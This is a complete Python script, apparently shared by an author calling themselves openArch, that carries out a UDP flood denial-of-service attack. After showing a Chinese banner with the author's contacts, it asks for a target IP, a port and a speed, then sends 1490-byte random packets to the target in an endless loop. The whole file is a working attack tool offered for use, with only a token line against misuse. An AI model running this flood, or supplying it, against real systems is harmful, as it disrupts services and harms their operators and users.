import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos - openArch")
print (" ")
print (" ")
print ("/--------------------------------------------------------------------\ ")
print ("|   作者          : openArch                                          |")
print ("|   作者CSDN博客  : https://blog.csdn.net/2301_82206160?type=blog     |")
print ("|   作者github    : https://github.com/open-Arch                      |")
print ("|   QQ群          : 686822329                                         |")
print ("\--------------------------------------------------------------------/")
print (" ")
print (" ")
print ("        -----------------[禁止滥用和二次贩卖盈利]-----------------      ")
print (" ")
print (" ")
ip = input("     > 输入目标IP       : ")
port = int(input("     > 攻击端口         : "))
sd = int(input("     > 攻击速度(1~1000) : "))

os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1     
     print ("已发送 %s 个本地数据包到 %s 端口 %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)

